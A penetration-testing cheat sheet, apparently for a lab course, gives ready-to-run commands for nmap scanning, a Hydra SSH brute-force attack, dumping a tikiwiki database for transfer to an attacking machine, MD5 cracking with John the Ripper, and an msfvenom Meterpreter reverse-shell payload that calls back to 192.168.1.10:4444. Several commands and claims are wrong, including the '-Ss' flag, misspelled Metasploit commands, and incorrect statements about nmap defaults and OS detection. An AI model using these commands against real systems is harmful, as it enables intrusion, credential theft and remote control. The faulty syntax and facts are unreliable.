### Nmap
#### Perform a SYN scan

Perform a SYN scan of the target subnet
```bash
nmap -sS 198.51.100.1
```

#### Passive and Active OS Scans
Using Passive and Active OS detection

```bash
#Running passive OS detection on 192.168.1.100
nmap 192.168.1.100 -O

#Running active OS detection on192.168.1.100
nmap 192.168.1.100 -A
```

#### Change the Speed
Increase or decreasing scan speeds using a scale from `-T1` (slowest) to `-T5` (fastest). `-T4` is the default.

```bash
# Run a scan on 172.16.1.200 as fast as possible
nmap -sU -T5 172.16.1.200

```
Remember that increasing scan speeds increases the likely hood that you'll be detected

#### Disable `ping` and `DNS` to be even quieter

Disable ping using `-Pn`

```bash
# Disable ping scan against 172.16.1.35
nmap -Pn -Ss 172.16.1.35
```
Disable `DNS` using `-n`

```bash
# Disable DNS scan against 172.16.1.48
nmap -n -Ss 172.16.1.35
```

### Ncat
#### Determine SSH

Determine the target's SSH version

```bash
# Run the command below and wait for the banner.
  ncat 198.51.100.1 22
```
### Metasploit

#### Use the database feature
To use the metasploit database function, you first have to start a database.

```bash
# Start the built-in postgres server
$ service posgresql

# Initialize the metasploit database
$ msfdb init

# Start Metasploit
$ msfconsole

# Check the status of the database (after you start metasploit)
msf > dB_status

```

#### Create Workspaces
After you have the database going, you can create workspaces for different engagements.

```bash
# List all workstations
msf > workspace

# Create a new workspace named 'lab'
msf > workspace -a lab

```

#### nmap VS db_nmap

If you want to save your `nmap` scans to this database, all of your `nmap` commands must use `db_nmap` instead of just `nmap`

```bash

# Use nmap for a SYN scan on 172.16.1.5
msf > db_nmap -sS 172.16.1.5

```

#### Hosts and Services

After you have run a few scans, you can see all of your results using `hosts` and `services`

```bash
# View all of the hosts you have scanned
msf > hosts

# View all of the services running that you have scanned
msf > services

```
<details>
  <summary>Expand for Explanations of Flags</summary>
  <ul>
    <li><code>service posgresql start</code> start postgres server
    <li><code>msfdb init</code> initialize msf db
    <li><code>msfconsole</code> start Metasploit
    <li><code>db_status</code> check status of Metasploit's database
    <li><code>workspace -a</code> create a new workspace  
    <li><code>workspace</code> view all workspaces
  </ul>
</details>

### Hydra
#### Perform an SSH Brute Force Attack

Perform a brute-force attack
```bash
hydra -L /usr/share/ncrack/short.usr -P /usr/share/ncrack/short.pwd ssh:198.51.100.1
```

Show Hydra's help options using the help command `hydra -h`

```bash
# Use a password list and a username list to bruteforce an ssh login

hydra -L /usr/share/ncrack/common.usr -P /usr/share/ncrack/default.pwd ssh://198.51.100.174

```
### MySQL

Remember that every MySQL command ends with a `;`

#### MySql Commands

Display all installed databases
```bash
show databases;
```
Connect to a specific database
```bash
use <db>;
```
Display all tables in a database.
```bash
show tables;
```
Display column names for a given table.
```bash
describe <table>;
```

Select all records from a table.

```bash
select * from <table>;
```

### mysqldump

Using mysqldump, you can save an entire database to a text file. This file can then be transferred back to your attacking machine with Ncat.

```bash
#Saves the `tikiwiki` database to `/tmp/tikiwiki.sql`.
sudo mysqldump tikiwiki > /tmp/tikiwiki.sql
```

### John the Ripper

John the Ripper is a common password cracker. It is free and easy to use. JtR is popular because it can crack a wide variety of hashes.

#### Crack MD5 Hashes

```bash
# Using md5 and a hashlist
john --format=raw-md5 <hashlist>

# Show passwords that have already been cracked
john --show <hashlist>
```

### SSH and SCP

Secure Shell (SSH) is commonly used for system administration because it encrypts all data sent between hosts.

Secure Copy (SCP) uses an SSH connection to copy files from host to host in an encrypted tunnel. SCP uses the general syntax of `scp file-to-copy destination-location`

```bash
Connect to a machine using SSH
ssh <username>@<IP Address>
```

To use SCP to copy a file from your machine to a remote machine scp <path/to/local.file> <Remote System User Name>@<Remote System IP Address>:</location/on/remote/machine>
```bash
# Example of copying a file to a remote machine 192.168.1.50 using the 'admin' user. Note that the admin user in this case is a user on the remote machine. NOT a user on the local machine. Here we are copying the file onto the Desktop of the admin user on the remote machine.
scp my_file.txt admin@192.168.1.50:/home/admin/Desktop/
```

You can also copy a file from the remote system to your local system using the syntax: scp <Remote System User Name>@<Remote System IP Address>:</location/on/remote/machine/my_file.txt> /location/on/local/machine

Below we will use the same remote machine IP address of 192.168.1.50 and the same admin user. Note that here we are specifying our 'user' Desktop but you can also use the `.` to copy to your current location.
```bash
# Example of copying a file from a remote system to your local machine.
scp admin@192.168.1.50:/home/admin/Desktop/my_file.txt /home/user/Desktop
```

```bash
# Example of copying to your current location
scp admin@192.168.1.50:/home/admin/Desktop/my_file.txt .
```

### MsfVenom

Create a `shell.elf` exploit

```bash
msfvenom --arch x86 --platform linux --payload linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 --format elf -o /tmp/shell.elf
```
After running this command, the file `shell.elf` contains a program that, when run, will open a Meterpreter connection to your computer's port 4444.
<details>
  <summary>Expand for explanation of flags.</summary>
  <ul>
    <li><code>--arch</code>: Tells `msfvenom` to create an executable that will run on x86 architecture.
    <li><code>--platform<code>: Specifies the target operating systemâ€”Linux, Windows, etc.
    <li><code>--payload</code>: Lets you specify exactly how you want your victim to connect back to you.
    <li><code>LHOST</code>: Specifies your IP address
    <li><code>LPORT</code>: The port on which you'll be listening.
  </ul>
</details>
